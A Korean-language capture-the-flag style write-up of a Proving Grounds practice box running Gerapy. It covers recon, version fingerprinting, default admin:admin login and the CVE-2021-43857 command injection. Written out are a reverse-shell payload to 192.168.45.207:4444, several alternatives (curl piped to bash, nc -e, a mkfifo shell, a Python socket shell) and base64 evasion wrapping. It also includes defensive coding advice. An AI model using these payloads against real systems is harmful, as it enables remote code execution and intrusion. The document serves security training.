---
tags:
  - type/machine
  - platform/pg
  - os/linux
  - status/solved
  - tech/web/default-creds
  - tech/lin/capabilities
  - tech/cred/reuse
  - tech/payload/revshell
type: machine
platform: pg
os: linux
ip: 192.168.161.24
ports: [22, 8000]
services: [http, ssh]
cves: [CVE-2021-43857]
status: solved
manual_tags: true
tech_count: 4
---
> [!info] PG Practice — Pentester Foundations #3
> **타겟** 192.168.248.24 · **OS** Ubuntu 22.04 · **난이도** Fundamental · **플래그 2개**
> **경로 요약** 8000 Gerapy `admin:admin` → 프로젝트 생성(선행조건) → `parse` 명령주입(CVE-2021-43857) → `app` → **권한상승 2경로**: `python3.10` cap_setuid / `app.service` 평문 root 비밀번호

## 0. 이 박스에서 배우는 것

- **버전 판정을 "독립 근거 2개 교차"로 못박는 방법론** — 이 노트의 최대 자산이다. 근거의 *개수*가 아니라 *독립성*이 관건이고, 출제자가 조작한 표식에 걸려 넘어지지 않는 법
- **`DEBUG = True`가 그 자체로 취약점인 이유** — Django 404 페이지가 URLconf 전체를 덤프한다. 디렉터리 브루트포싱이 통째로 생략된다
- **`shell=True` 명령주입의 메커니즘** — 왜 백틱인가, 왜 `/bin/bash -c`로 한 번 더 감싸야 하는가, 왜 출력이 안 돌아오는가
- **Linux capabilities** — SUID와 무엇이 다른가, `cap_setuid`가 왜 root가 되는가, `getcap -r /` 출력에서 정상(`ping`의 `cap_net_raw`)과 비정상(인터프리터)을 가려내는 눈
- **공개 익스플로잇이 죽었을 때 전제조건을 직접 만들어주는 접근** — EDB 50640은 "프로젝트가 최소 1개"를 암묵 전제로 깔고 있다
- **권한상승 경로가 둘일 때의 우열 판단** — "root가 됐다"가 아니라 "안정적인 발판이 됐다"가 기준이다

> [!tip] 시험 출제 가능성
> **높다.** 다만 CVE-2021-43857 자체가 아니라 **구성 요소별로** 나온다.
> - **관리 UI + 기본 자격증명 + 인증 후 명령주입** — OSCP 시험 웹 박스의 가장 흔한 골격이다. 제품만 바뀐다(Gerapy → Jenkins·Rundeck·Ajenti·Webmin·Cacti…)
> - **개발 서버 배너 → `DEBUG=True` → 정보 노출** — Django/Flask/Rails 어디서나 같은 모양이다
> - **`getcap`으로 푸는 권한상승** — SUID 다음으로 자주 나오는 리눅스 privesc 유형이다. `python`·`perl`·`tar`·`gdb`에 붙은 capability
> - **설정 파일/주석에 박힌 평문 비밀번호** — `/etc/systemd/system/`·`/opt`·`.env`·백업 파일. 시험에서 가장 자주 통하는 저비용 열거다
>
> 변형 예상: 주입 파라미터가 `spider`가 아니라 파일명·호스트명·검색어이거나, capability가 `cap_setuid` 대신 `cap_dac_read_search`(=`/etc/shadow` 읽기)로 바뀌는 형태.

---

## 1. 정찰

### 1-1. Nmap

```bash
┌──(kali㉿kali)-[~/PG/Levram]
└─$ sudo nmap -sCV -p- -Pn -A --min-rate 5000 -oN nmap.log 192.168.248.24
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)
8000/tcp open  http    WSGIServer 0.2 (Python 3.10.6)
```

> [!note] 플래그 해설
> | 플래그 | 역할 | 빼면 어떻게 되나 |
> |---|---|---|
> | `-sCV` | 기본 NSE 스크립트 + 서비스/버전 탐지 | 배너를 못 얻는다. `WSGIServer 0.2`라는 **이 박스의 첫 단서가 통째로 사라진다** |
> | `-p-` | 전 65535 포트 | 8000은 기본 1000포트 밖이다. **`-p-`를 안 돌리면 SSH만 보고 끝난다** |
> | `-Pn` | 핑 스캔 생략 | ICMP를 막은 타겟이면 "호스트 다운"으로 오판해 스캔 자체가 안 돈다. PG/시험 랩에서는 **항상 붙인다** |
> | `--min-rate 5000` | 초당 최소 패킷 | 없으면 `-p-`가 수십 분 걸린다. 시험의 24시간을 갉아먹는 주범 |
> | `-A` | OS/트레이스라우트/스크립트 묶음 | 없어도 되지만 초기 정찰에서는 정보량이 이득 |
> | `-oN nmap.log` | 사람이 읽는 포맷으로 저장 | 재스캔 비용을 없앤다. **시험 보고서 증거로도 쓴다** |

포트가 딱 둘이다. `WSGIServer 0.2` = **Django 개발 서버**. 이 배너 자체가 정보다 — 운영 환경에 개발 서버를 띄웠다는 뜻이고, 그렇다면 `DEBUG = True`일 가능성이 높다.

> [!tip] 배너 → 다음 수 매핑
> | 배너 | 즉시 의심할 것 |
> |---|---|
> | `WSGIServer/0.2 CPython/x.y` | Django `runserver` → **`DEBUG=True`** → 아무 경로나 때려 스택트레이스/URLconf 확인 |
> | `Werkzeug/x.y Python/x.y` | Flask 개발 서버 → `/console` (Werkzeug 디버거 PIN) 확인 |
> | `WEBrick` | Ruby 개발 서버 → 동일 계열 |
> | `gunicorn`·`uWSGI`·`nginx` | 운영 구성 → `DEBUG` 기대치 낮춤. 앱 자체를 파야 한다 |

`<title>Gerapy</title>` 로 제품 확정. Gerapy = Scrapy 분산 크롤러 관리 UI(Django 기반).

### 1-2. 버전 특정 — 독립 증거 3개로 못박기

[[Hub]]에서 `readme.txt` 하나를 믿었다가 버전을 틀렸다. 그 교훈을 적용해 **출처가 서로 다른 근거 3개**로 교차 검증했다. (원리와 일반화는 **2-1**에서 깊게 다룬다. 여기서는 관측 원문만 남긴다.)

**증거 A — 라이브 URLconf의 트레일링 슬래시** (런타임, 최강)

`DEBUG=True` 덕에 404가 URLconf를 덤프한다. Gerapy는 **0.9.8에서 URL 패턴의 끝 슬래시를 제거**했으므로 이게 그대로 판별자가 된다.

```bash
┌──(kali㉿kali)-[~/PG/Levram]
└─$ curl -s http://192.168.248.24:8000/zzz404 | grep -oE '\^api/(client|task|index/status)/?\$'
^api/index/status/$
^api/client/$
^api/task/$
```

PyPI에서 0.9.5~0.9.11 sdist를 받아 `gerapy/server/core/urls.py`를 해시하면 두 그룹으로 갈린다:

```bash
┌──(kali㉿kali)-[~/PG/Levram]
└─$ md5sum gerapy-0.9.*/gerapy/server/core/urls.py
5d599d129a89be8629536a04aeece25a  gerapy-0.9.5/.../urls.py
5d599d129a89be8629536a04aeece25a  gerapy-0.9.6/.../urls.py
5d599d129a89be8629536a04aeece25a  gerapy-0.9.7/.../urls.py   ← 슬래시 있음
b083b057711ce1cf29356a8bc28e6432  gerapy-0.9.8/.../urls.py   ← 슬래시 없음
b083b057711ce1cf29356a8bc28e6432  gerapy-0.9.9/.../urls.py
b083b057711ce1cf29356a8bc28e6432  gerapy-0.9.11/.../urls.py
```

→ 타겟은 **{0.9.5, 0.9.6, 0.9.7} 중 하나**이고 **0.9.8 이상은 확실히 아니다.**

**증거 B — webpack 자산 해시** (A와 독립. 파일 내용에서 파생된 값이라 위조가 어렵다)

프런트엔드 번들 파일명에 콘텐츠 해시가 박혀 있다. 라이브가 참조하는 30개 자산명을 공식 wheel과 대조하면:

```bash
┌──(kali㉿kali)-[~/PG/Levram]
└─$ curl -s http://192.168.248.24:8000/ | grep -oE 'app\.[0-9a-f]+\.js'
app.21167fa2.js
```

| 버전 | 30개 자산명 일치 수 | 메인 번들 |
|---|---|---|
| 0.9.5 | 0 / 30 | `app.747409e0.js` |
| 0.9.6 | 0 / 30 | `app.747409e0.js` |
| **0.9.7** | **30 / 30** | **`app.21167fa2.js`** |
| 0.9.8 | 7 / 30 | `app.6999e9f7.js` |

**A ∩ B = 0.9.7 확정.**

**증거 C — UI 푸터 문자열** (런타임이지만 출제자가 손댐 → 최약)

```bash
┌──(kali㉿kali)-[~/PG/Levram]
└─$ curl -s http://192.168.248.24:8000/static/js/app.21167fa2.js | grep -oE 'Gerapy v[0-9.]+'
Gerapy v0.9.7
```

> [!warning] 이 근거는 출제자가 조작한 것이다
> 서빙되는 `app.21167fa2.js`는 **26541바이트, 정품 0.9.7 wheel은 26533바이트** — 8바이트 차이가 난다.
> `cmp -l`로 좁히면 편집은 정확히 두 군데다: 기본 로케일 `lang:"zh"` → `lang:"en"`, 그리고 **푸터에 버전 문자열 삽입**(정품 0.9.7은 `Gerapy All Rights Reserved.`로 버전이 **없다**).
> 즉 이 푸터는 상류 산출물이 아니라 **박스 제작자가 찍어준 표식**이다. A·B와 일치하지만 셋 중 가장 약한 근거로 취급한다.

CVE-2021-43857은 **0.9.8에서 패치**됐다. 0.9.7 확정 = 취약.

### 1-3. 열거 — Django `DEBUG=True`가 지도를 그려준다

존재하지 않는 경로를 때리면 Django가 **URLconf 전체를 덤프**한다.

```bash
┌──(kali㉿kali)-[~/PG/Levram]
└─$ curl -s http://192.168.248.24:8000/nonexistent | grep -oE '\^api/[^<]*' | head
^api/project/(\S+)/parse
^api/project/create
^api/project/index
...
```

> [!tip] `DEBUG = True`는 그 자체로 취약점이다
> 404 페이지가 **전체 라우팅 테이블**을 뱉는다. 디렉터리 브루트포싱을 할 필요조차 없다.
> Django/Flask 계열을 만나면 **아무 경로나 하나 때려서 스택트레이스가 나오는지부터 확인**한다. 나오면 열거는 거기서 끝이다.

> [!danger] 스캐너 함정 — gobuster/feroxbuster가 여기서 쓸모없어지는 이유
> `DEBUG=True` Django는 **없는 경로에도 200이 아니라 500/404 HTML을 크게 뱉는다.** 워드리스트 브루트포싱은
> ① 응답 길이가 제각각이라 필터링이 안 잡히고, ② 정답(`/api/project/<name>/parse`)이 **와일드카드 세그먼트를 포함**해 워드리스트로는 애초에 못 맞힌다.
> **URLconf 덤프 한 방이 워드리스트 수십만 줄보다 정확하다.** 스캐너를 돌리기 전에 404 본문을 눈으로 읽어라.

### 1-4. 인증 — 기본 자격증명

```bash
┌──(kali㉿kali)-[~/PG/Levram]
└─$ curl -s -X POST http://192.168.248.24:8000/api/user/auth \
     -H 'Content-Type: application/json' \
     -d '{"username":"admin","password":"admin"}'
{"token":"710dcf5387645f05a0484347be4a8509ea749008"}
```

**`admin:admin`** 성립. 이후 모든 요청에 `Authorization: Token <값>` 을 붙인다.

전체 API를 훑어보면 **비인증으로 열린 것은 `/api/user/auth` 하나뿐**이고 나머지는 전부 `401 {"detail":"Authentication credentials were not provided."}`다. 즉 **이 토큰 하나가 모든 것의 관문**이었고, 기본 자격증명이 아니었다면 이 박스는 SSH 브루트포스 외에 길이 없었다.

> [!note] DRF 토큰 인증의 형식은 `Bearer`가 아니다
> Django REST Framework의 `TokenAuthentication`은 **`Authorization: Token <키>`** 를 쓴다.
> 반사적으로 `Bearer`를 붙이면 전부 401이 돌아오고, "토큰이 틀렸나" 하며 시간을 태우게 된다.
> | 프레임워크 | 헤더 |
> |---|---|
> | DRF `TokenAuthentication` | `Authorization: Token <키>` |
> | JWT (`SimpleJWT`·대부분의 OAuth2) | `Authorization: Bearer <키>` |
> | 일부 자체 구현 | `X-API-Key`·`X-Auth-Token` |
> **401이 계속 나오면 토큰이 아니라 스킴 이름을 의심하라.**

DRF는 `OPTIONS`에 비인증으로 스키마를 내준다 — 파라미터 이름을 모를 때 유용하다:

```bash
┌──(kali㉿kali)-[~/PG/Levram]
└─$ curl -s -X OPTIONS http://192.168.248.24:8000/api/user/auth
{"name":"Obtain Auth Token","renders":["application/json"],
 "actions":{"POST":{"username":{"type":"string","required":true},
 "password":{"type":"string","required":true},
 "token":{"type":"string","required":false,"read_only":true}}}}
```

> [!tip] `OPTIONS`는 DRF에서 공짜 문서다
> DRF의 `SimpleMetadata`가 뷰의 시리얼라이저를 읽어 **필드명·타입·필수 여부**를 그대로 내준다.
> 파라미터 이름을 모를 때 **추측하지 말고 `OPTIONS`를 먼저 던진다.** `/api/project/<name>/parse` 의 `spider` 같은 이름도 이 방식으로 확인할 수 있다.

---

## 2. 취약점 분석

### 2-1. 버전 판정 방법론 — "근거 2개"가 아니라 "독립 근거 2개"

> [!abstract] 왜 이게 취약점 분석의 첫 절인가
> 이 박스에서 실제 익스플로잇은 `curl` 한 줄이다. **어려운 부분은 전부 "타겟이 정말 0.9.7인가"에 있었다.**
> 버전을 틀리면 취약하지 않은 CVE를 붙잡고 몇 시간을 태운다 — 시험에서 가장 비싼 실수다.

**근거의 독립성이란 무엇인가.** 두 근거가 독립이라는 말은 "출처 파일이 다르다"가 아니라 **"하나를 위조해도 다른 하나는 안 따라 움직인다"** 는 뜻이다. 축으로 정리하면:

| 축 | 이 박스에서 | 위조 난이도 | 독립성 |
|---|---|---|---|
| **서버측 코드의 런타임 동작** | URLconf 덤프의 트레일링 슬래시 (증거 A) | 높음 — `urls.py`를 실제로 고쳐야 하고, 고치면 앱이 깨진다 | 기준축 |
| **프런트엔드 빌드 산출물의 파일명 집합** | 30개 webpack 자산명 (증거 B) | 높음 — 30개를 전부 다른 릴리스와 맞추려면 그 릴리스를 통째로 배포해야 한다 | **A와 독립** |
| **제품이 스스로 선언한 문자열** | 푸터 `Gerapy v0.9.7` (증거 C) | **극히 낮음** — 텍스트 한 줄 | **B와 독립 아님** |

> [!danger] 증거 C는 증거 B와 **같은 파일**에서 나왔다
> C의 출처는 `app.21167fa2.js` 다. 그런데 B가 대조한 30개 자산 목록에도 **바로 그 파일**이 들어 있다.
> 즉 C는 새 근거가 아니라 **B가 이미 본 파일의 내부를 한 번 더 들여다본 것**이다.
> 표준의 문장이 여기서 그대로 적용된다 — **"근거 3개가 전부 같은 파일에서 나왔다면 그건 근거 1개다."**
> 그래서 최종 판정은 `A ∩ B ∩ C`가 아니라 **`A ∩ B`** 다. C는 확인 사살일 뿐 판정에 기여하지 않는다.

**왜 트레일링 슬래시가 판별자가 되는가.** Django의 URLconf는 정규식이다.

```
^api/client/$      ← 0.9.7까지: 슬래시가 패턴의 일부
^api/client$       ← 0.9.8부터: 제거됨
```

`$`는 문자열 끝 앵커다. 즉 `/` 유무는 **디자인 취향이 아니라 매칭 규칙 자체의 변경**이고, 라이브 서버가 자기 정규식을 그대로 화면에 뱉어주므로 위조하려면 서버 코드를 직접 고쳐야 한다. 릴리스 노트의 "Breaking change"가 곧 최고의 판별자인 이유가 이것이다.

> [!warning] `APPEND_SLASH` 때문에 브라우저로는 이 차이가 안 보인다
> Django의 `CommonMiddleware`는 `APPEND_SLASH=True`(기본값)일 때 `/api/client` 가 404가 나면 **`/api/client/` 로 301 리다이렉트**한다.
> 그래서 브라우저나 평범한 `curl -L`로는 두 버전이 똑같이 동작하는 것처럼 보인다.
> **차이는 리다이렉트 동작이 아니라 404 본문에 덤프된 정규식 원문에 있다.** 관측 지점을 잘못 고르면 판별자가 사라진다.

**왜 webpack 콘텐츠 해시가 강한가 — 그리고 어디서 무너지는가.** webpack/vite는 번들 파일명에 `[contenthash]`를 박는다. 내용이 1바이트만 바뀌어도 이름이 바뀐다. 그래서 **파일명은 내용에 대한 서명**처럼 작동하고, 30개가 전부 일치하면 그 릴리스의 프런트엔드 빌드와 같다고 봐도 된다.

단, 무너지는 지점이 정확히 하나 있다:

> [!danger] 콘텐츠 해시는 **빌드 시점의 주장**이지 **현재 내용의 증명**이 아니다
> 이 박스가 그 반례다. `app.21167fa2.js` 는 이름이 `21167fa2`인데 실제 내용은 정품보다 **8바이트 길다**(26541 vs 26533).
> 출제자가 **재빌드 없이 산출물을 직접 편집**했기 때문이다. 편집해도 파일명은 그대로 남는다.
> → **파일명 일치는 "이 릴리스에서 파생됐다"까지만 보증하고, "내용이 정품과 같다"는 보증하지 않는다.**
> 정품 여부까지 확인하려면 **크기·해시를 실제로 대조**해야 한다. 이 박스에서는 그 대조가 곧 증거 C의 조작을 잡아냈다.

**"제품이 스스로 말하는 버전"은 언제나 최약 근거다.** 푸터·`/about`·`readme.txt`·`X-Powered-By`·`<meta name="generator">`는 전부 같은 등급이다. 공격자에게 유용한 만큼 방어자·출제자에게도 **가장 만지기 쉬운 표면**이기 때문이다. [[Hub]]에서 틀린 이유가 정확히 이것이었다.

> [!tip] 버전 특정의 일반 절차
> 1. **런타임 동작의 차이**를 찾는다 — URL 패턴, API 응답 필드, 에러 메시지 형식. 릴리스 노트의 "Breaking change"가 곧 판별자다.
> 2. **콘텐츠 해시가 박힌 정적 자산**(webpack/vite 번들)을 공식 배포본과 대조한다. 파일 내용에서 파생되므로 신뢰도가 높다.
> 3. 후보를 좁혔으면 **PyPI/npm/GitHub에서 실제 배포본을 받아 diff**한다. 추측하지 말고 대조한다.
> 4. **출처가 다른 근거 2개 이상이 교차할 때만 확정**한다. 근거 3개가 전부 같은 파일에서 나왔다면 그건 근거 1개다.

> [!tip] 시험용 압축판 — 3분 안에 끝내는 버전 판정
> 1. 배너/푸터/`generator`로 **후보 범위**를 잡는다 (신뢰하지 말고 범위만).
> 2. 그 제품의 **CVE 패치 버전**을 찾는다 (예: "0.9.8에서 수정"). 판정에 필요한 건 정확한 버전이 아니라 **"패치 경계의 어느 쪽인가"** 뿐이다.
> 3. 패치 커밋의 **관측 가능한 부작용** 하나만 확인한다 — URL 패턴, 응답 필드 추가, 파라미터 이름 변경.
> 4. 확인되면 **바로 익스플로잇으로 넘어간다.** 30개 자산 대조 같은 정밀 작업은 **경계 판정이 애매할 때만** 한다.

### 2-2. 배경 지식 — `DEBUG = True` 는 왜 취약점 클래스인가

Django는 `DEBUG=True`일 때 예외를 **개발자용 페이지**로 렌더한다. 여기서 새는 것이 셋이다.

| 노출 | 내용 | 공격 가치 |
|---|---|---|
| **URLconf 덤프** (404) | "Django tried these URL patterns, in this order" 아래에 **모든 라우트 정규식** | 열거 완전 생략. 이 박스에서 `^api/project/(\S+)/parse` 를 여기서 얻었다 |
| **스택트레이스 + 로컬 변수** (500) | 프레임별 지역 변수값 | DB 연결 문자열·토큰·경로가 그대로 보이는 경우가 많다 |
| **설정 덤프** (500) | `settings` 전체 (`SECRET_KEY`·`PASSWORD` 등 키워드 매칭 항목만 마스킹) | 마스킹을 피한 키(`SALT`·`SEED`·커스텀 이름)는 그대로 나온다 |
| **`ALLOWED_HOSTS` 완화** | `DEBUG=True`면 호스트 헤더 검증이 느슨해진다 | 가상호스트 우회 |

핵심은 **이것이 "정보 노출"에 그치지 않는다**는 점이다. 이 박스에서 `DEBUG=True`는 취약점 하나가 아니라 **취약점을 찾는 시간을 0으로 만든 도구**였다. 다른 서비스였다면 URL을 브루트포싱하다 `parse` 엔드포인트를 영영 못 찾았을 수도 있다.

### 2-3. 배경 지식 — `shell=True` 명령주입

Python에서 `subprocess.Popen(cmd, shell=True)` 또는 `os.system(cmd)`는 문자열을 **`/bin/sh -c "<cmd>"`** 로 넘긴다. 즉 문자열이 셸 파서를 거친다. 셸 파서는 아래 문자를 **명령 구분자/치환자**로 해석한다.

| 메타문자 | 의미 | 출력이 필요한가 |
|---|---|---|
| `` `cmd` `` | 명령 치환(POSIX) — **원 명령의 인자 위치에 그대로 끼워도 문법이 안 깨진다** | 불필요 |
| `$(cmd)` | 명령 치환(현대 문법) — 백틱과 동등, 중첩에 강함 | 불필요 |
| `;` `\n` | 명령 종료 후 다음 명령 | 뒤 문법이 깨질 수 있음 |
| `\|` | 파이프 | 앞 명령의 종료를 요구 |
| `&&` `\|\|` | 조건부 연쇄 | 앞 명령의 종료코드에 의존 |
| `&` | 백그라운드 실행 | 응답 지연 회피에 유용 |

> [!note] 왜 이 박스에서는 백틱인가
> 주입 지점은 `spider` **파라미터 값**이다. 서버가 조립하는 명령은 대략 `scrapy parse ... <spider> ...` 꼴이므로, `;` 로 끊으면 **뒤에 남은 인자들이 새 명령의 인자가 되어** 문법이 깨질 수 있다.
> 백틱/`$()`는 **값이 놓일 자리를 그대로 유지한 채** 안쪽만 실행하고 결과 문자열로 치환된다. **주입 지점이 인자 위치일 때 가장 안전한 선택**이다.
> `;`·`&&`가 실패했다고 "주입이 안 된다"고 결론내면 안 된다. **치환 계열을 반드시 함께 시도하라.**

> [!warning] 이건 **블라인드** 명령주입이다
> 백틱의 결과 문자열은 `scrapy parse`의 인자로 들어갈 뿐, **HTTP 응답으로 돌아오지 않는다.**
> 따라서 `id` 를 주입해도 화면에서 확인할 수 없다. 확인 채널은 둘뿐이다:
> 1. **시간** — `` `sleep 5` `` 후 응답 시간 비교
> 2. **아웃바운드** — `` `curl http://<칼리>/x` `` 또는 곧바로 리버스셸
>
> 이 박스는 아웃바운드가 열려 있어 **확인 단계를 건너뛰고 바로 리버스셸**을 던져도 됐다. 막혀 있었다면 `sleep`으로 먼저 성립을 확인하는 것이 정석이다.

### 2-4. 왜 취약한가 — CVE-2021-43857 데이터 흐름

취약점은 `/api/project/<name>/parse` 의 **`spider` 파라미터**가 `shell=True` 서브프로세스로 흘러가는 것이다. 백틱이 그대로 실행된다.

데이터 흐름을 단계로 끊으면:

```
POST /api/project/pwn/parse      Authorization: Token <토큰>
  body: {"spider": "<사용자 입력>"}
        │
        ▼  ① DRF가 JSON을 파싱해 request.data['spider'] 로 꺼낸다  (검증 없음)
        ▼  ② scrapy 명령 문자열에 문자열 연결로 삽입             (인용/이스케이프 없음)
        ▼  ③ shell=True 로 서브프로세스 실행 → /bin/sh -c "..."
        ▼  ④ sh가 백틱을 명령 치환으로 해석하고 실행
   app 권한으로 임의 명령 실행
```

세 가지가 겹쳐야 성립한다 — **①에서 검증이 없고, ②에서 인용이 없고, ③에서 셸을 거친다.** 이 중 하나만 고쳐도 막힌다.

| 결함 | 안전한 대안 |
|---|---|
| ① 입력 검증 없음 | 화이트리스트(스파이더 이름은 실제 존재하는 목록에서만) |
| ② 문자열 연결 | `shlex.quote()` — 단, 근본 해법은 아님 |
| ③ `shell=True` | **`shell=False` + 리스트 인자** (`subprocess.run(["scrapy","parse",spider])`) → 셸 파서를 아예 안 거치므로 메타문자가 그냥 문자열이 된다 |

> [!note] `shell=True` vs `shell=False` — 이 한 줄이 전부다
> ```python
> subprocess.run(f"scrapy parse {spider}", shell=True)     # ← 취약: sh -c 로 넘어간다
> subprocess.run(["scrapy", "parse", spider])               # ← 안전: execve 인자 배열, 셸 없음
> ```
> 리스트 형태는 `` ` `` 나 `;` 가 들어와도 **`scrapy`에게 전달되는 하나의 인자 문자열**일 뿐이다.
> 코드 감사에서 `shell=True`·`os.system`·`os.popen`·`commands.getoutput` 를 grep하는 이유가 이것이다.

**패치와 인증 요건.** CVE-2021-43857은 0.9.8에서 수정됐다. 그리고 이 취약점은 **인증 후(post-auth)** 다 — `parse` 엔드포인트가 `Authorization: Token`을 요구하기 때문이다.

> [!danger] "인증 필요"를 이유로 CVE를 넘기지 마라
> CVSS는 인증 요구를 감점 요인으로 보지만, **기본 자격증명이 살아 있으면 인증은 장벽이 아니다.**
> 이 박스의 실제 구조는 `admin:admin` **하나가 유일한 방벽**이었고, 그것이 무너지자 RCE까지 직행이다.
> 시험에서도 같다 — **"인증 후 RCE" CVE를 봤다면 먼저 기본 자격증명·약한 비밀번호를 시도하라.** 그 조합이 가장 흔한 출제 형태다.

### 2-5. 왜 이 페이로드인가 — 조각 해설

최종 페이로드는 이것이다:

```
{"spider":"`/bin/bash -c 'bash -i >& /dev/tcp/192.168.45.207/4444 0>&1'`"}
```

층이 네 겹이다. 각 층이 왜 필요한지 위에서부터 벗겨본다.

| 층 | 조각 | 역할 | 빼면 어떻게 되나 |
|---|---|---|---|
| 1 | `` ` ... ` `` | **명령 치환** — 인자 자리를 유지한 채 안쪽을 실행 | 그냥 스파이더 이름 문자열로 취급되어 아무 일도 안 일어난다 |
| 2 | `/bin/bash -c '...'` | **bash로 승격** | `shell=True`는 `/bin/sh`를 쓰고, **Ubuntu의 `/bin/sh`는 dash**다. dash에는 `/dev/tcp`도 `>&`도 **없다** → 조용히 실패한다 |
| 3 | `bash -i` | 대화형 셸 — 프롬프트·잡 제어가 붙는다 | 명령은 붙지만 프롬프트가 없어 쓰기 불편하다 |
| 4 | `>& /dev/tcp/192.168.45.207/4444` | **stdout+stderr을 TCP 소켓에 리다이렉트**. bash 전용 가상 경로다 | 출력이 안 돌아온다 |
| 4 | `0>&1` | **stdin을 같은 소켓에서 읽는다** | 명령을 타이핑할 수 없는 반쪽 셸이 된다 |

> [!danger] 2층을 빼먹는 것이 이 유형 최대의 함정
> `` `bash -i >& /dev/tcp/IP/PORT 0>&1` `` 를 그대로 넣으면 **백틱 안쪽이 dash로 실행**된다.
> dash는 `/dev/tcp`라는 가상 경로를 모르고 `>&` 문법도 지원하지 않는다 → **에러도 안 보이는 무반응.**
> "명령주입이 안 되나 보다"라고 오판하기 딱 좋다. **명령주입 페이로드에는 항상 `/bin/bash -c '...'` 로 감싸는 습관을 들여라.**
> `/dev/tcp`가 아예 없는 환경(일부 컨테이너·`--enable-net-redirections` 비활성 빌드)에서는 아래로 갈아탄다:
> ```
> `curl http://192.168.45.207/s.sh|bash`
> `nc -e /bin/bash 192.168.45.207 4444`          # -e 없는 nc면 실패
> `mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 192.168.45.207 4444 >/tmp/f`
> `python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("192.168.45.207",4444));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn("/bin/bash")'`
> ```

**셸 인용의 5중 중첩.** 실제 `curl` 명령에서 페이로드가 이렇게 보이는 이유:

```
-d '{"spider":"`/bin/bash -c '"'"'bash -i >& /dev/tcp/192.168.45.207/4444 0>&1'"'"'`"}'
```

| 층 | 경계 문자 | 누가 해석하나 |
|---|---|---|
| 1 | `-d '...'` 바깥 작은따옴표 | **로컬 bash** (curl 인자 만들기) |
| 2 | `{...}` | JSON 파서 (DRF) |
| 3 | `"spider":"..."` 큰따옴표 | JSON 문자열 |
| 4 | `` `...` `` | 원격 `/bin/sh` |
| 5 | `bash -c '...'` 작은따옴표 | 원격 `/bin/sh` → bash 인자 만들기 |

`'"'"'` 는 **로컬 bash 문자열 안에 리터럴 `'` 를 넣는 관용구**다: 작은따옴표 닫기(`'`) → 큰따옴표로 감싼 작은따옴표(`"'"`) → 다시 열기(`'`).

> [!tip] 인용 중첩이 4겹을 넘으면 인코딩으로 회피하라
> 손으로 따옴표를 세는 순간 실수가 시작된다. **페이로드를 base64로 감싸면 인용 문제가 통째로 사라진다**:
> ```bash
> echo -n 'bash -i >& /dev/tcp/192.168.45.207/4444 0>&1' | base64 -w0
> ```
> 주입 문자열은 `` `echo <b64>|base64 -d|bash` `` 가 된다 — 영숫자와 `=`·`+`·`/` 뿐이라 어느 층에서도 안 깨진다.
> [[Hawat]]의 hex 리터럴(`0x3c3f...`), [[Exfiltrated]]의 base64 래핑과 **같은 계열의 회피 기법**이다.

### 2-6. 왜 "프로젝트 생성"이 선행조건인가

`parse`의 URL은 `^api/project/(\S+)/parse` 다. `(\S+)` 자리에 들어가는 것은 **존재하는 프로젝트 이름**이어야 한다. 프로젝트가 0개면 뷰가 프로젝트 디렉터리를 찾다가 명령 조립 지점에 도달하기 전에 실패한다.

즉 이 박스의 실제 공격 사슬은 **2단계**다:

```
① POST /api/project/create   ← 취약점이 아니라 "무대 설치"
② POST /api/project/pwn/parse ← 진짜 주입 지점
```

브리핑은 "프로젝트 생성 기능을 통해 명령이 실행된다"고 하는데, 정확히는 **생성은 선행조건이고 주입은 `parse`** 다. 이 오해가 6장 ①의 원인이 된다.

> [!tip] 일반화 — **"상태를 만들어야 도달하는 코드"** 를 의심하라
> 취약한 코드가 **비어 있는 시스템에서는 실행되지 않는** 경우가 흔하다. 프로젝트·업로드된 파일·등록된 사용자·저장된 작업이 최소 1개 있어야 그 경로로 흘러간다.
> 그래서 **"기능을 정상적으로 한 번 써본 뒤" 다시 공격하는 것**이 순서다. 아무것도 없는 상태에서 엔드포인트를 때려보고 "취약하지 않다"고 판단하는 것이 이 유형의 대표적 오진이다.
> 같은 이유로 공개 익스플로잇도 이 전제를 코드에 안 적어두고 깔아둔다 (6장 ①).

### 2-7. 이 클래스를 다시 만나면 — 인증 후 명령주입 일반 절차

> [!abstract] 제품은 바뀌어도 골격은 같다
> Gerapy·Jenkins·Rundeck·Ajenti·Webmin·Cacti·Zabbix·LibreNMS — 전부 **"관리 UI가 백엔드 명령을 대신 실행해주는" 제품**이다.
> 그래서 **사용자 입력이 명령줄에 닿는 지점이 반드시 존재**하고, 그것이 이 클래스의 항구적인 공격면이다.

**① 주입 지점 후보를 고르는 기준.** 모든 파라미터를 찔러볼 시간은 없다. **"이 값이 명령줄에 실릴 것 같은가"** 로 좁힌다.

| 파라미터가 뜻하는 것 | 명령줄에 실릴 가능성 | 예 |
|---|---|---|
| 실행 대상의 **이름** | **매우 높음** | `spider`(이 박스) · `job` · `task` · `script` · `playbook` |
| **호스트/IP/도메인** | **매우 높음** | ping·traceroute·nmap 래퍼, `host` · `target` |
| **파일 경로/파일명** | 높음 | 백업·압축·변환 기능의 `filename` · `path` |
| **옵션 문자열** | 높음 | `args` · `options` · `flags` — 그대로 이어붙는 경우가 많다 |
| 숫자 ID · 불리언 | 낮음 | 대개 ORM/정수 캐스팅을 거친다 |

**② 확인 사다리 — 위험도 낮은 것부터 올라간다.** 리버스셸을 먼저 던지고 실패하면 **원인이 주입 실패인지 아웃바운드 차단인지 구분이 안 된다.**

| 단계 | 페이로드 | 무엇을 판정하나 | 관측 채널 |
|---|---|---|---|
| 1 | `` `id` `` | 문법이 안 깨지는가 (500이 안 나는가) | 응답 코드 |
| 2 | `` `sleep 5` `` | **명령이 실제로 실행되는가** | **응답 시간** ← 가장 확실 |
| 3 | `$(sleep 5)` | 백틱이 필터링됐을 때의 대체 | 응답 시간 |
| 4 | `` `curl http://KALI/a` `` / `` `ping -c1 KALI` `` | **아웃바운드가 열려 있는가** | 칼리의 `nc -lvnp 80` · `tcpdump -i tun0 icmp` |
| 5 | 리버스셸 | 최종 | 리스너 |

> [!danger] 4단계를 건너뛰면 실패 원인을 특정할 수 없다
> 2단계(`sleep`)가 통했는데 5단계가 안 붙는다 → **주입은 성립, 아웃바운드가 문제.** 포트를 443·80·53으로 바꾼다.
